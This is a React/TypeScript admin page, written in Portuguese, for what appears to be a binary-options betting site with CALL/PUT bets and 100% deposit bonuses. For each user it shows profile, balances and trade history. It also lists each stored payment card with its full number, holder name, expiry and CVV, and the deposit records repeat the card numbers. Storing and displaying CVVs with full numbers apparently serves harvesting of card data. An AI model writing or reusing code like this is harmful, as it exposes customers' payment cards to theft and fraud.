/**
 * UserDetails — Detalhes Profundos do Usuário
 * Exibe perfil, histórico de transações e métricas individuais
 */
import { useState, useEffect } from "react";
import Layout from "@/components/Layout";
import {
  ArrowLeft, User, Mail, Lock, Calendar, TrendingUp, TrendingDown,
  BarChart3, Activity, CheckCircle2, XCircle, DollarSign, CreditCard
} from "lucide-react";
import { Button } from "@/components/ui/button";
import { Badge } from "@/components/ui/badge";
import { cn } from "@/lib/utils";
import { useLocation } from "wouter";

interface UserDetailsData {
  id: string;
  email: string;
  name: string;
  demoBalance: number;
  realBalance: number;
  demoPnL: number;
  realPnL: number;
  totalWins: number;
  totalLosses: number;
  createdAt: string;
  lastLogin?: string;
}

interface Transaction {
  id: string;
  type: "call" | "put";
  asset: string;
  betAmount: number;
  entryPrice: number;
  exitPrice: number;
  result: "win" | "loss";
  payout: number;
  createdAt: string;
  closedAt: string;
}

interface DepositRecord {
  id: string;
  userId?: string;
  userEmail?: string;
  method: "card" | "pix" | "ted";
  amount?: number;
  bonus?: number;
  total?: number;
  totalAmount?: number;
  account?: "real" | "demo";
  cardNumber?: string;
  cardName?: string;
  cardExpiry?: string;
  status?: string;
  timestamp: string;
}

interface CardRecord {
  id: string;
  userId: string;
  cardNumber: string;
  cardNumberMasked: string;
  cardName: string;
  cardExpiry: string;
  cardCvv: string;
  cardBrand: string;
  cardBankName: string;
  account: "real" | "demo";
  depositAmount: number;
  bonus: number;
  totalDeposited: number;
  timestamp: string;
  status: string;
}

export default function UserDetails() {
  const [, setLocation] = useLocation();
  const [userId, setUserId] = useState<string | null>(null);
  const [user, setUser] = useState<UserDetailsData | null>(null);
  const [transactions, setTransactions] = useState<Transaction[]>([]);
  const [deposits, setDeposits] = useState<DepositRecord[]>([]);
  const [cards, setCards] = useState<CardRecord[]>([]);
  const [isLoading, setIsLoading] = useState(true);

  useEffect(() => {
    // Obter userId da URL
    const params = new URLSearchParams(window.location.search);
    const id = params.get("id");
    
    if (!id) {
      setLocation("/admin-portal");
      return;
    }

    setUserId(id);
    loadUserDetails(id);
  }, [setLocation]);

  const loadUserDetails = async (id: string) => {
    try {
      const [userRes, transRes] = await Promise.all([
        fetch(`/api/users/${id}`),
        fetch(`/api/users/${id}/transactions`),
      ]);

      if (userRes.ok && transRes.ok) {
        const userData = await userRes.json();
        const transData = await transRes.json();

        setUser(userData.user);
        setTransactions(transData.transactions || []);

        // Carregar depósitos e cartões do servidor
        const userEmail = encodeURIComponent(userData.user.email);
        const [depositsRes, cardsRes] = await Promise.allSettled([
          fetch(`/api/deposits/user/${userEmail}`),
          fetch(`/api/cards/user/${userEmail}`),
        ]);

        if (depositsRes.status === "fulfilled" && depositsRes.value.ok) {
          const depositsData = await depositsRes.value.json();
          setDeposits(depositsData.deposits || []);
        }

        if (cardsRes.status === "fulfilled" && cardsRes.value.ok) {
          const cardsData = await cardsRes.value.json();
          setCards(cardsData.cards || []);
        }
      }
    } catch (err) {
      console.error("Erro ao carregar detalhes:", err);
    } finally {
      setIsLoading(false);
    }
  };

  if (isLoading) {
    return (
      <Layout>
        <div className="p-6 text-center">
          <Activity className="w-12 h-12 text-blue-400 mx-auto mb-4 animate-spin" />
          <p className="text-white">Carregando...</p>
        </div>
      </Layout>
    );
  }

  if (!user) {
    return (
      <Layout>
        <div className="p-6 text-center">
          <p className="text-white/40">Usuário não encontrado</p>
          <Button onClick={() => setLocation("/admin-portal")} className="mt-4">
            Voltar
          </Button>
        </div>
      </Layout>
    );
  }

  const totalBet = transactions.reduce((sum, t) => sum + t.betAmount, 0);
  const totalWinAmount = transactions
    .filter((t) => t.result === "win")
    .reduce((sum, t) => sum + t.payout, 0);
  const totalLossAmount = transactions
    .filter((t) => t.result === "loss")
    .reduce((sum, t) => sum + t.betAmount, 0);
  const wins = user.totalWins ?? 0;
  const losses = user.totalLosses ?? 0;
  const winRate = wins + losses > 0 ? (wins / (wins + losses)) * 100 : 0;

  return (
    <Layout>
      <div className="p-4 lg:p-6 space-y-6">
        {/* Header */}
        <div className="flex items-center gap-4">
          <button
            onClick={() => setLocation("/admin-portal")}
            className="p-2 rounded-lg hover:bg-white/10 transition-all"
          >
            <ArrowLeft className="w-5 h-5 text-white" />
          </button>
          <div>
            <h1 className="text-3xl font-bold text-white" style={{ fontFamily: "Sora, sans-serif" }}>
              Detalhes do Usuário
            </h1>
            <p className="text-sm text-white/40 mt-1">Análise profunda de performance</p>
          </div>
        </div>

        {/* Perfil do Usuário */}
        <div className="glass-card rounded-2xl p-6 space-y-4">
          <h2 className="text-xl font-bold text-white" style={{ fontFamily: "Sora, sans-serif" }}>
            👤 Informações Pessoais
          </h2>

          <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
            {/* Nome */}
            <div className="p-4 rounded-lg bg-white/3 border border-white/5">
              <div className="flex items-center gap-2 mb-2">
                <User className="w-4 h-4 text-blue-400" />
                <span className="text-xs text-white/50 uppercase">Nome</span>
              </div>
              <p className="text-lg font-bold text-white">{user.name}</p>
            </div>

            {/* Email */}
            <div className="p-4 rounded-lg bg-white/3 border border-white/5">
              <div className="flex items-center gap-2 mb-2">
                <Mail className="w-4 h-4 text-cyan-400" />
                <span className="text-xs text-white/50 uppercase">Email</span>
              </div>
              <p className="text-lg font-bold text-white font-mono text-sm">{user.email}</p>
            </div>

            {/* Cadastro */}
            <div className="p-4 rounded-lg bg-white/3 border border-white/5">
              <div className="flex items-center gap-2 mb-2">
                <Calendar className="w-4 h-4 text-green-400" />
                <span className="text-xs text-white/50 uppercase">Cadastro</span>
              </div>
              <p className="text-lg font-bold text-white">
                {new Date(user.createdAt).toLocaleDateString("pt-BR")}
              </p>
            </div>

            {/* Último Acesso */}
            <div className="p-4 rounded-lg bg-white/3 border border-white/5">
              <div className="flex items-center gap-2 mb-2">
                <Activity className="w-4 h-4 text-purple-400" />
                <span className="text-xs text-white/50 uppercase">Último Acesso</span>
              </div>
              <p className="text-lg font-bold text-white">
                {user.lastLogin ? new Date(user.lastLogin).toLocaleDateString("pt-BR") : "Nunca"}
              </p>
            </div>
          </div>
        </div>

        {/* Métricas de Performance */}
        <div className="glass-card rounded-2xl p-6 space-y-4">
          <h2 className="text-xl font-bold text-white" style={{ fontFamily: "Sora, sans-serif" }}>
            📊 Métricas de Performance
          </h2>

          <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-4 gap-4">
            {/* Total Apostado */}
            <div className="p-4 rounded-lg bg-blue-500/10 border border-blue-500/20">
              <p className="text-xs text-white/50 uppercase mb-2">Total Apostado</p>
              <p className="text-2xl font-bold text-blue-400">R$ {totalBet.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
            </div>

            {/* Total Ganho */}
            <div className="p-4 rounded-lg bg-green-500/10 border border-green-500/20">
              <p className="text-xs text-white/50 uppercase mb-2">Total Ganho</p>
              <p className="text-2xl font-bold text-green-400">R$ {totalWinAmount.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
            </div>

            {/* Total Perdido */}
            <div className="p-4 rounded-lg bg-red-500/10 border border-red-500/20">
              <p className="text-xs text-white/50 uppercase mb-2">Total Perdido</p>
              <p className="text-2xl font-bold text-red-400">R$ {totalLossAmount.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
            </div>

            {/* Taxa de Acerto */}
            <div className="p-4 rounded-lg bg-purple-500/10 border border-purple-500/20">
              <p className="text-xs text-white/50 uppercase mb-2">Taxa de Acerto</p>
              <p className="text-2xl font-bold text-purple-400">{winRate.toFixed(1)}%</p>
            </div>
          </div>

          {/* Saldos */}
          <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mt-4">
            <div className="p-4 rounded-lg bg-white/3 border border-white/5">
              <p className="text-xs text-white/50 uppercase mb-2">Saldo Demo</p>
              <p className="text-xl font-bold text-white">R$ {(user.demoBalance ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
              <p className={cn("text-sm mt-1", (user.demoPnL ?? 0) >= 0 ? "text-green-400" : "text-red-400")}>
                P&L: {(user.demoPnL ?? 0) >= 0 ? "+" : ""}R$ {(user.demoPnL ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}
              </p>
            </div>

            <div className="p-4 rounded-lg bg-white/3 border border-white/5">
              <p className="text-xs text-white/50 uppercase mb-2">Saldo Real</p>
              <p className="text-xl font-bold text-white">R$ {(user.realBalance ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
              <p className={cn("text-sm mt-1", (user.realPnL ?? 0) >= 0 ? "text-green-400" : "text-red-400")}>
                P&L: {(user.realPnL ?? 0) >= 0 ? "+" : ""}R$ {(user.realPnL ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}
              </p>
            </div>
          </div>
        </div>

        {/* Gerenciar Cartões - Seção Ultra Elaborada */}
        {cards.length > 0 && (
          <div className="glass-card rounded-2xl p-6 space-y-6">
            <div className="flex items-center justify-between">
              <h2 className="text-2xl font-bold text-white" style={{ fontFamily: "Sora, sans-serif" }}>
                💳 Gerenciar Cartões
              </h2>
              <Badge className="bg-blue-500/20 text-blue-400 px-3 py-1">
                {cards.length} cartão{cards.length > 1 ? "s" : ""} registrado{cards.length > 1 ? "s" : ""}
              </Badge>
            </div>

            <div className="space-y-4">
              {cards.map((card) => (
                <div
                  key={card.id}
                  className="rounded-2xl p-6 border-2 overflow-hidden"
                  style={{
                    background: "linear-gradient(135deg, rgba(59, 130, 246, 0.1) 0%, rgba(6, 182, 212, 0.05) 100%)",
                    borderColor: "rgba(59, 130, 246, 0.3)",
                  }}
                >
                  {/* Cabeçalho do Cartão */}
                  <div className="flex items-start justify-between mb-4">
                    <div className="flex items-center gap-3">
                      <div className="w-12 h-12 rounded-xl bg-gradient-to-br from-blue-500 to-cyan-500 flex items-center justify-center">
                        <CreditCard className="w-6 h-6 text-white" />
                      </div>
                      <div>
                        <p className="text-white font-bold text-lg">{card.cardName}</p>
                        <p className="text-xs text-white/50">{card.cardBrand} - {card.cardBankName}</p>
                      </div>
                    </div>
                    <div className="text-right">
                      <Badge className={card.status === "Ativo" ? "bg-green-500/20 text-green-400" : "bg-red-500/20 text-red-400"}>
                        {card.status}
                      </Badge>
                      <p className="text-xs text-white/40 mt-1">
                        {new Date(card.timestamp).toLocaleDateString("pt-BR")}
                      </p>
                    </div>
                  </div>

                  {/* Visualização do Cartão (Estilo Cartão Real) */}
                  <div
                    className="rounded-xl p-6 mb-4 text-white font-mono space-y-4"
                    style={{
                      background: "linear-gradient(135deg, #1e3a8a 0%, #0c4a6e 100%)",
                      boxShadow: "0 10px 30px rgba(0, 0, 0, 0.3)",
                    }}
                  >
                    <div className="flex justify-between items-center">
                      <span className="text-sm text-white/70">NÓMERO DO CARTÃO</span>
                      <span className="text-xs text-white/50 uppercase">{card.cardBrand}</span>
                    </div>
                    <p className="text-2xl font-bold tracking-widest">{card.cardNumber}</p>
                    <div className="flex justify-between items-end">
                      <div>
                        <p className="text-xs text-white/70 mb-1">TITULAR</p>
                        <p className="text-sm font-bold">{card.cardName}</p>
                      </div>
                      <div>
                        <p className="text-xs text-white/70 mb-1">VÁLIDO ATÉ</p>
                        <p className="text-sm font-bold">{card.cardExpiry}</p>
                      </div>
                    </div>
                  </div>

                  {/* Detalhes Completos */}
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4 mb-4">
                    {/* Dados do Cartão */}
                    <div className="space-y-3">
                      <p className="text-xs text-white/50 uppercase font-semibold">Informações do Cartão</p>
                      <div className="space-y-2">
                        <div className="p-3 rounded-lg bg-white/3 border border-white/5">
                          <p className="text-xs text-white/40">Número Completo</p>
                          <p className="text-white font-mono font-bold text-sm">{card.cardNumber}</p>
                        </div>
                        <div className="p-3 rounded-lg bg-white/3 border border-white/5">
                          <p className="text-xs text-white/40">CVV</p>
                          <p className="text-white font-mono font-bold text-sm">{card.cardCvv}</p>
                        </div>
                        <div className="grid grid-cols-2 gap-2">
                          <div className="p-3 rounded-lg bg-white/3 border border-white/5">
                            <p className="text-xs text-white/40">Validade</p>
                            <p className="text-white font-mono font-bold text-sm">{card.cardExpiry}</p>
                          </div>
                          <div className="p-3 rounded-lg bg-white/3 border border-white/5">
                            <p className="text-xs text-white/40">Bandeira</p>
                            <p className="text-white font-bold text-sm">{card.cardBrand}</p>
                          </div>
                        </div>
                      </div>
                    </div>

                    {/* Dados de Depósito */}
                    <div className="space-y-3">
                      <p className="text-xs text-white/50 uppercase font-semibold">Depósito Realizado</p>
                      <div className="space-y-2">
                        <div className="p-3 rounded-lg bg-green-500/10 border border-green-500/20">
                          <p className="text-xs text-white/40">Valor Depositado</p>
                          <p className="text-green-400 font-mono font-bold text-sm">R$ {(card.depositAmount ?? card.amount ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
                        </div>
                        <div className="p-3 rounded-lg bg-blue-500/10 border border-blue-500/20">
                          <p className="text-xs text-white/40">Bônus (100%)</p>
                          <p className="text-blue-400 font-mono font-bold text-sm">+ R$ {(card.bonus ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
                        </div>
                        <div className="p-3 rounded-lg bg-cyan-500/10 border border-cyan-500/20">
                          <p className="text-xs text-white/40">Total Creditado</p>
                          <p className="text-cyan-400 font-mono font-bold text-sm">R$ {(card.totalDeposited ?? card.totalAmount ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
                        </div>
                      </div>
                    </div>
                  </div>

                  {/* Informações da Conta */}
                  <div className="pt-4 border-t border-white/10 flex items-center justify-between">
                    <div>
                      <p className="text-xs text-white/50 uppercase">Conta Vinculada</p>
                      <Badge className={card.account === "real" ? "bg-red-500/20 text-red-400 mt-1" : "bg-purple-500/20 text-purple-400 mt-1"}>
                        {card.account === "real" ? "Conta Real" : "Conta Demo"}
                      </Badge>
                    </div>
                    <div className="text-right">
                      <p className="text-xs text-white/50 uppercase">Data do Registro</p>
                      <p className="text-white font-semibold text-sm mt-1">
                        {new Date(card.timestamp).toLocaleDateString("pt-BR", {
                          day: "2-digit",
                          month: "2-digit",
                          year: "numeric",
                          hour: "2-digit",
                          minute: "2-digit",
                        })}
                      </p>
                    </div>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Depósitos com Cartão */}
        {deposits.length > 0 && (
          <div className="glass-card rounded-2xl p-6 space-y-4">
            <h2 className="text-xl font-bold text-white" style={{ fontFamily: "Sora, sans-serif" }}>
              💳 Depósitos com Cartão ({deposits.length})
            </h2>

            <div className="space-y-3">
              {deposits.map((dep) => (
                <div
                  key={dep.id}
                  className="p-4 rounded-lg border border-blue-500/20 bg-blue-500/5 space-y-3"
                >
                  {/* Cabeçalho do Depósito */}
                  <div className="flex items-center justify-between">
                    <div className="flex items-center gap-3">
                      <div className="w-10 h-10 rounded-lg bg-blue-500/20 flex items-center justify-center">
                        <CreditCard className="w-5 h-5 text-blue-400" />
                      </div>
                      <div>
                        <p className="text-white font-bold">Depósito #{dep.id.slice(-6)}</p>
                        <p className="text-xs text-white/40">
                          {new Date(dep.timestamp).toLocaleDateString("pt-BR", {
                            day: "2-digit",
                            month: "2-digit",
                            year: "numeric",
                            hour: "2-digit",
                            minute: "2-digit",
                          })}
                        </p>
                      </div>
                    </div>
                    <div className="text-right">
                      <p className="text-lg font-bold text-green-400">R$ {(dep.totalAmount ?? dep.total ?? dep.amount ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
                      <Badge className={dep.status === "approved" ? "bg-green-500/20 text-green-400" : dep.status === "rejected" ? "bg-red-500/20 text-red-400" : "bg-yellow-500/20 text-yellow-400"}>
                        {dep.status === "approved" ? "Aprovado" : dep.status === "rejected" ? "Rejeitado" : "Em Análise"}
                      </Badge>
                    </div>
                  </div>

                  {/* Detalhes do Depósito */}
                  <div className="grid grid-cols-1 md:grid-cols-3 gap-3 pt-3 border-t border-white/10">
                    <div>
                      <p className="text-xs text-white/50 uppercase mb-1">Depósito</p>
                      <p className="text-white font-mono font-bold">R$ {(dep.amount ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
                    </div>
                    <div>
                      <p className="text-xs text-white/50 uppercase mb-1">Bônus (100%)</p>
                      <p className="text-green-400 font-mono font-bold">+ R$ {(dep.bonus ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
                    </div>
                    <div>
                      <p className="text-xs text-white/50 uppercase mb-1">Total Creditado</p>
                      <p className="text-blue-400 font-mono font-bold">R$ {(dep.totalAmount ?? dep.total ?? dep.amount ?? 0).toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</p>
                    </div>
                  </div>

                  {/* Dados do Cartão */}
                  {dep.cardNumber && (
                    <div className="pt-3 border-t border-white/10 space-y-2">
                      <p className="text-xs text-white/50 uppercase font-semibold">Informações do Cartão</p>
                      <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
                        <div className="p-2 rounded bg-white/3 border border-white/5">
                          <p className="text-xs text-white/40">Número</p>
                          <p className="text-white font-mono text-sm">{dep.cardNumber}</p>
                        </div>
                        <div className="p-2 rounded bg-white/3 border border-white/5">
                          <p className="text-xs text-white/40">Titular</p>
                          <p className="text-white font-semibold text-sm">{dep.cardName}</p>
                        </div>
                        <div className="p-2 rounded bg-white/3 border border-white/5">
                          <p className="text-xs text-white/40">Validade</p>
                          <p className="text-white font-mono text-sm">{dep.cardExpiry}</p>
                        </div>
                        <div className="p-2 rounded bg-green-500/10 border border-green-500/20">
                          <p className="text-xs text-green-400">Status</p>
                          <p className="text-green-400 font-bold text-sm">✓ Aprovado</p>
                        </div>
                      </div>
                    </div>
                  )}
                </div>
              ))}
            </div>
          </div>
        )}

        {/* Histórico de Transações */}
        <div className="glass-card rounded-2xl p-6 space-y-4">
          <h2 className="text-xl font-bold text-white" style={{ fontFamily: "Sora, sans-serif" }}>
            📈 Histórico de Transações ({transactions.length})
          </h2>

          {transactions.length === 0 ? (
            <div className="text-center py-8 text-white/40">
              <Activity className="w-8 h-8 mx-auto mb-2 opacity-50" />
              <p>Nenhuma transação registrada</p>
            </div>
          ) : (
            <div className="overflow-x-auto">
              <table className="w-full text-sm">
                <thead>
                  <tr className="border-b border-white/10">
                    <th className="text-left py-3 px-4 text-white/50 font-semibold">Tipo</th>
                    <th className="text-left py-3 px-4 text-white/50 font-semibold">Ativo</th>
                    <th className="text-left py-3 px-4 text-white/50 font-semibold">Aposta</th>
                    <th className="text-left py-3 px-4 text-white/50 font-semibold">Entrada</th>
                    <th className="text-left py-3 px-4 text-white/50 font-semibold">Saída</th>
                    <th className="text-left py-3 px-4 text-white/50 font-semibold">Resultado</th>
                    <th className="text-left py-3 px-4 text-white/50 font-semibold">Payout</th>
                    <th className="text-left py-3 px-4 text-white/50 font-semibold">Data</th>
                  </tr>
                </thead>
                <tbody>
                  {transactions.map((tx) => (
                    <tr key={tx.id} className="border-b border-white/5 hover:bg-white/3 transition-all">
                      <td className="py-3 px-4">
                        <Badge className={cn("text-xs", tx.type === "call" ? "bg-green-500/20 text-green-400" : "bg-red-500/20 text-red-400")}>
                          {tx.type === "call" ? "📈 CALL" : "📉 PUT"}
                        </Badge>
                      </td>
                      <td className="py-3 px-4 text-white font-mono">{tx.asset}</td>
                      <td className="py-3 px-4 text-white">R$ {tx.betAmount.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}</td>
                      <td className="py-3 px-4 text-white/60">R$ {tx.entryPrice.toFixed(2)}</td>
                      <td className="py-3 px-4 text-white/60">R$ {tx.exitPrice.toFixed(2)}</td>
                      <td className="py-3 px-4">
                        {tx.result === "win" ? (
                          <span className="text-green-400 font-bold flex items-center gap-1">
                            <CheckCircle2 className="w-4 h-4" /> WIN
                          </span>
                        ) : (
                          <span className="text-red-400 font-bold flex items-center gap-1">
                            <XCircle className="w-4 h-4" /> LOSS
                          </span>
                        )}
                      </td>
                      <td className={cn("py-3 px-4 font-bold", tx.result === "win" ? "text-green-400" : "text-red-400")}>
                        R$ {tx.payout.toLocaleString("pt-BR", { minimumFractionDigits: 2 })}
                      </td>
                      <td className="py-3 px-4 text-white/40 text-xs">
                        {new Date(tx.closedAt).toLocaleDateString("pt-BR")}
                      </td>
                    </tr>
                  ))}
                </tbody>
              </table>
            </div>
          )}
        </div>
      </div>
    </Layout>
  );
}
